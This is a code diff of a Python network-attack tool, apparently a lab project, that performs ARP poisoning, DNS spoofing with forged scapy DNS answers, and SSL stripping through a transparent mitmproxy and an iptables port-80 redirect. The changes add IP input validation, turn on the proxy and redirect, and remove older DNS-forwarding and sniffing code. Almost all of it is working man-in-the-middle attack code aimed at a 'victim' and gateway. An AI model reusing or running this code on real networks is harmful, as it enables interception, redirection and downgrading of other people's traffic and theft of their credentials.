@@ -107,9 +107,34 @@ def ARPposioning():
     )
 
 
+def request_input(type, msg, count, invalid_msg, invalid_count_msg):
+    output = None
+    while not output:
+        output = custom_input(msg)
+        if type == "ip":
+            output = parse_ip_input(output)
+        elif type == "domain":
+            output = validate_domain(output)
+        else:
+            output = None
+
+        if len(output) != count:
+            output = None
+            print(invalid_count_msg)
+        
+        if not output:
+            print(invalid_msg)
+        
+    return output
+
+
 def DNSpoisoning():
     global dns_ip
     global dns_domain
+
+    ip_victim = ""
+    ip_gateway = ""
+
     # Make sure IP forwarding is enabled
     os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
 
@@ -124,36 +149,41 @@ def DNSpoisoning():
         if dns_domain_valid:
             dns_domain = dns_domain_input
         else:
-            print(
-                "{warning}Please enter a valid domain (format: www.example.com){endc}".format(
-                    warning=bcolors.WARNING, endc=bcolors.ENDC
-                )
-            )
+            print("{warning}Please enter a valid domain (format: www.example.com){endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))
 
     # Ask for an IP to resolve the given domain to until a valid one is provided
     while not dns_ip:
-        dns_ip_input = custom_input(
-            "Enter the IP address to redirect the spoofed domain name to: "
-        )
+        dns_ip_input = custom_input("Enter the IP address to redirect the spoofed domain name to: ")
         dns_ip_parsed = parse_ip_input(dns_ip_input)
 
         if len(dns_ip_parsed) == 1:
             dns_ip = dns_ip_parsed[0]
         else:
-            print(
-                "{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(
-                    warning=bcolors.WARNING, endc=bcolors.ENDC
-                )
-            )
+            print("{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))
 
-    ip_victim = custom_input("Enter the IP of the victim u chose: ")
-    ip_gate = custom_input("Enter the IP of the gateway (probably 10.0.2.1): ")
+    # Ask for the IP of the victim until a valid one is provided
+    while not ip_victim:
+        ip_victim_input = custom_input("Enter the IP of the victim u chose: ")
+        ip_victim_parsed = parse_ip_input(ip_victim_input)
+
+        if len(ip_victim_parsed) == 1:
+            ip_victim = ip_victim_parsed[0]
+        else:
+            print("{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))
+        
+    # Ask for the IP of the gateway until a valid one is provided
+    while not ip_gateway:
+        ip_gateway_input = custom_input("Enter the IP of the gateway: ")
+        ip_gateway_parsed = parse_ip_input(ip_gateway_input)
+
+        if len(ip_gateway_parsed) == 1:
+            ip_gateway = ip_gateway_parsed[0]
+        else:
+            print("{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))
 
     # Start up a thread spoofing every 4 seconds
     interval = 4
-    arp_spoof_thread = threading.Thread(
-        target=arp_spoof_continuously, args=(ip_gate, ip_victim, interval)
-    )
+    arp_spoof_thread = threading.Thread(target=arp_spoof_continuously, args=(ip_gateway, ip_victim, interval))
     arp_spoof_thread.daemon = True
     arp_spoof_thread.start()
 
@@ -188,8 +218,10 @@ def netfilter_queue():
 
 def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
+
     if scapy_packet.haslayer(DNSRR):
         qname = scapy_packet[DNSQR].qname
+
         if dns_domain in qname.decode():
             print("[+] Spoofing target")
             answer = DNSRR(rrname=qname, rdata=dns_ip)
@@ -200,161 +232,56 @@ def process_packet(packet):
             del scapy_packet[UDP].len
             del scapy_packet[UDP].chksum
             packet.set_payload(bytes(scapy_packet))
+    
     packet.accept()
 
-
-def sniffing(dns_domain, ipVictim, ipGate, RUNINGTHREAD):
-    while True:
-        if RUNINGTHREAD == False:
-            break
-        sniff(
-            filter="udp port 53",
-            prn=partial(
-                dns_reply, dns_dom=dns_domain, ipVictim=ipVictim, ipGate=ipGate
-            ),
-            store=0,
-            iface=NET_INTERFACE,
-            count=1,
-        )
-
-
-def dns_reply(packet, dns_dom, ipVictim, ipGate):
-    print(packet[DNSQR].qname, dns_dom)
-    if packet[DNSQR].qname == dns_dom + "." and packet[IP].src == ipVictim:
-        # Construct the DNS packet
-        # Construct the Ethernet header by looking at the sniffed packet
-        eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
-
-        # Construct the IP header by looking at the sniffed packet
-        ip = IP(src=packet[IP].dst, dst=packet[IP].src)
-
-        # Construct the UDP header by looking at the sniffed packet
-        udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
-
-        # Construct the DNS response by looking at the sniffed packet and manually
-
-        dns = DNS(
-            id=packet[DNS].id,
-            qd=packet[DNS].qd,
-            aa=1,
-            rd=0,
-            qr=1,
-            qdcount=1,
-            ancount=1,
-            nscount=0,
-            arcount=0,
-            ar=DNSRR(
-                rrname=packet[DNS].qd.qname, type="A", ttl=600, rdata="192.168.56.102"
-            ),
-        )
-
-        # Put the full packet together
-        response_packet = eth / ip / udp / dns
-
-        # Send the DNS response
-        sendp(response_packet, iface=NET_INTERFACE)
-
-        # forward the packet to the gateway (unimplemented)
-
-
-def dns_forwarding():
-    """
-    Function for sniffing DNS requests and responses and calling the callback.
-    """
-    print("Now sniffing for DNS requests and responses...")
-
-    ip_gateway = "10.0.2.1"
-    mac_gateway = "52:54:00:12:35:00"
-
-    # Sniff for DNS requests and responses and pass ip_gateway
-    sniff(
-        filter="udp port 53",
-        prn=partial(
-            dns_forwarding_callback, ip_gateway=ip_gateway, mac_gateway=mac_gateway
-        ),
-        store=0,
-        iface=NET_INTERFACE,
-        count=1,
-    )
-
-
-def dns_forwarding_callback(packet, ip_gateway, mac_gateway):
-    """
-    Callback function in DNS forwarding sniff, forwarding DNS requests to the gateway and DNS responses
-    to the victim.
-    """
-    ip_victim = "10.0.2.4"
-    ip_attacker = "10.0.2.5"
-    mac_victim = "08:00:27:09:75:00"
-    mac_attacker = "08:00:27:0b:33:f8"
-    print(
-        "Sniffed a DNS packet. IP/MAC gateway: {ip_gateway}/{mac_gateway}".format(
-            ip_gateway=ip_gateway, mac_gateway=mac_gateway
-        )
-    )
-
-    is_dns_request = (
-        packet.haslayer(IP)
-        and packet[IP].src == "10.0.2.4"
-        and packet.haslayer(DNS)
-        and packet[DNS].qr == 0
-    )
-    is_dns_response = (
-        packet.haslayer(IP)
-        and packet[IP].src == "10.0.2.1"
-        and packet.haslayer(DNS)
-        and packet[DNS].qr == 1
-    )
-
-    # Forward DNS requests to the gateway. Source should be the attacker, destination should be the gateway
-    if is_dns_request:
-        print("Sniffed DNS packet is a DNS request")
-        eth = Ether(src=mac_attacker, dst=mac_gateway)
-        ip = IP(src=ip_attacker, dst=ip_gateway)
-        udp = UDP(sport=53, dport=53)
-        dns = packet[DNS]
-
-        dns_request = eth / ip / udp / dns
-
-        print(dns_request.summary())
-
-        sendp(dns_request, iface=NET_INTERFACE)
-
-    # Forward DNS responses to the victim
-    if is_dns_response:
-        print("Sniffed DNS packet is a DNS response")
-        eth = Ether(src=mac_gateway, dst=mac_victim)
-        ip = IP(src=ip_gateway, dst=ip_victim)
-        udp = UDP(sport=53, dport=53)
-        dns = packet[DNS]
-
-        dns_response = eth / ip / udp / dns
-
-        sendp(dns_response, iface=NET_INTERFACE)
 
 
 def SSLstripping():
     """
     Function for executing the SSL stripping attack.
 
-    Assumes ARP poisoning has been executed. That means we're spoofing the gateway, so in order to allow
-    the victim to connect to the internet, we need to forward the DNS requests to the gateway.
+    This function starts off by spoofing the gateway and the victim. Then, it starts a proxy server
+    using MITMProxy. The proxy server will intercept all HTTP requests and responses. This interception
+    allows us to downgrade the HTTPS responses to HTTP responses and execute an SSL stripping attack.
+
+    To route all traffic through the proxy, we use the IPTABLES command to redirect all traffic to port 80
+    to port 8080. This is required because the proxy server is running on port 8080.
     """
-    # Update: lulw
-    # Basically, we have a setting to toggle IP forwarding. We don't spoof or do anything with the DNS requests, so just let them go to the server
-    # "Just letting them go" means to set the packets to return to the victim, not us as the attacker. The ipv4 forward setting will automatically forward
-    # the responses of these packets, while we're still a MITM impersonating the gateway according to the victim. We can then do the sniffing as normal.
-    dns_forwarding_thread = threading.Thread(target=dns_forwarding)
-    dns_forwarding_thread.daemon = True
-    dns_forwarding_thread.start()
+
+    ip_gateway = ""
+    ip_victim = ""
+
+    # Ask for the IP of the gateway until a valid one is provided
+    while not ip_gateway:
+        ip_gateway_input = custom_input("Enter the IP of the gateway: ")
+        ip_gateway_parsed = parse_ip_input(ip_gateway_input)
+
+        if len(ip_gateway_parsed) == 1:
+            ip_gateway = ip_gateway_parsed[0]
+        else:
+            print("{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))
+    
+    # Ask for the IP of the victim until a valid one is provided
+    while not ip_victim:
+        ip_victim_input = custom_input("Enter the IP of the victim: ")
+        ip_victim_parsed = parse_ip_input(ip_victim_input)
+
+        if len(ip_victim_parsed) == 1:
+            ip_victim = ip_victim_parsed[0]
+        else:
+            print("{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))
+
+    spoof(ip_gateway, ip_victim)
+    spoof(ip_victim, ip_gateway)
 
     # Run the proxy in a new thread
-    # proxy_thread = threading.Thread(target=run_proxy, args=("localhost", 8080))
-    # proxy_thread.daemon = True
-    # proxy_thread.start()
+    proxy_thread = threading.Thread(target=run_proxy, args=("localhost", 8080))
+    proxy_thread.daemon = True
+    proxy_thread.start()
 
-    # # Run the IPTABLES command to redirect traffic to the proxy
-    # os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080")
+    # Run the IPTABLES command to redirect traffic to the proxy
+    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080")
 
     # Run the SSL stripping attack using Scapy only instead of using MITMProxy, IPTABLES and the SSLStrip tool. Build it from scratch.
     # Concept:
@@ -364,10 +291,14 @@ def SSLstripping():
     # 4. When received, modify the response headers, strip the links and secure tags in the response body and forward the response to the client
 
     # Set of SSL/TLS capable hosts
-    secure_hosts = set()
+    # secure_hosts = set()
 
     # Transform the request and response functions above into Scapy code
     def request(packet):
+        print('Sniffed a TCP packet')
+        print(packet.summary())
+        print('Packet has TCP: {has_tcp}, has raw: {has_raw}, TCP destination port: {tcp_dport}'.format(
+            has_tcp=packet.haslayer(TCP), has_raw=packet.haslayer(Raw), tcp_dport=packet[TCP].dport))
         if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 80:
             print(packet[TCP].payload)
 
@@ -375,20 +306,16 @@ def SSLstripping():
         if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 80:
             print(packet[TCP].payload)
 
-    # Sniff for HTTP requests in a new thread
-    ssl_strip_thread = threading.Thread(
-        target=ssl_strip_sniffing, args=(request, response)
-    )
-    ssl_strip_thread.daemon = True
-    ssl_strip_thread.start()
+    # # Sniff for HTTP requests in a new thread
+    # ssl_strip_thread = threading.Thread(target=ssl_strip_sniffing, args=(request, response))
+    # ssl_strip_thread.daemon = True
+    # ssl_strip_thread.start()
 
-    print(
-        "\n{cyan}{attack}{endc} has been executed (you're now a MitM)\n\n".format(
-            cyan=bcolors.OKCYAN,
-            attack=ATTACKS["c"],
-            endc=bcolors.ENDC,
-        )
-    )
+    print("\n{cyan}{attack}{endc} has been executed (you're now a MitM)\n\n".format(
+        cyan=bcolors.OKCYAN,
+        attack=ATTACKS["c"],
+        endc=bcolors.ENDC,
+    ))
 
 
 def ssl_strip_sniffing(request, response):
@@ -402,8 +329,6 @@ class RequestLogger:
 
 def run_proxy(host, port):
     # Start an MITM proxy server + master in Python 2.7 (mitmproxy version 0.18.2)
-    # Make sure to set the proxy as transparent
-    # https://docs.mitmproxy.org/stable/howto-transparent/
     opts = options.Options(mode="transparent")
     c = proxy.config.ProxyConfig(opts)
     s = proxy.server.ProxyServer(config=c)
@@ -439,16 +364,9 @@ def scan_ip(network, iface):
 
 
 def mapAddresses():
-    print(
-        "  We shall now map the ip addresses of each device on the network to their corresponding MAC addresses: \n"
-    )
+    print("  We shall now map the ip addresses of each device on the network to their corresponding MAC addresses: \n")
     scan_ip("10.0.2.0/24", "enp0s8")
     scan_ip("192.168.56.1/24", "enp0s3")
-
-
-def stopSniffing():
-    global RUNINGTHREAD
-    RUNINGTHREAD = False
 
 
 def main():
@@ -457,46 +375,24 @@ def main():
     while True:
         print("Select the preferred attack from the list below:\n")
 
-        print(
-            "    {cyan}a{endc}) {attack}".format(
-                cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC
-            )
-        )
-        print(
-            "    {cyan}b{endc}) {attack}".format(
-                cyan=bcolors.OKCYAN, attack=ATTACKS["b"], endc=bcolors.ENDC
-            )
-        )
-        print(
-            "    {cyan}c{endc}) {attack}".format(
-                cyan=bcolors.OKCYAN, attack=ATTACKS["c"], endc=bcolors.ENDC
-            )
-        )
-        print(
-            "    {cyan}d{endc}) {attack}".format(
-                cyan=bcolors.OKCYAN, attack=ATTACKS["d"], endc=bcolors.ENDC
-            )
-        )
-        print(
-            "    {cyan}e{endc}) Exit\n".format(cyan=bcolors.OKCYAN, endc=bcolors.ENDC)
-        )
+        print("    {cyan}a{endc}) {attack}".format(cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC))
+        print("    {cyan}b{endc}) {attack}".format(cyan=bcolors.OKCYAN, attack=ATTACKS["b"], endc=bcolors.ENDC))
+        print("    {cyan}c{endc}) {attack}".format(cyan=bcolors.OKCYAN, attack=ATTACKS["c"], endc=bcolors.ENDC))
+        print("    {cyan}d{endc}) {attack}".format(cyan=bcolors.OKCYAN, attack=ATTACKS["d"], endc=bcolors.ENDC))
+        print("    {cyan}e{endc}) Exit\n".format(cyan=bcolors.OKCYAN, endc=bcolors.ENDC))
 
         choice = custom_input("\nYour choice: ")
         selectedName = choice
+        
         if choice in ATTACKS:
             selectedName = ATTACKS[choice]
-            stopSniffing()
         elif choice == "e":
             selectedName = "Exit"
-            stopSniffing()
-        print(
-            "You have selected {cyan}{name}{endc}. \n".format(
-                cyan=bcolors.OKCYAN, name=selectedName, endc=bcolors.ENDC
-            )
-        )
+        
+        print("You have selected {cyan}{name}{endc}. \n".format(cyan=bcolors.OKCYAN, name=selectedName, endc=bcolors.ENDC))
 
         if choice == "e":
-            # Remove potential IP tables redirect
+            # Remove potential IP tables redirects
             try:
                 os.system(
                     "iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080"
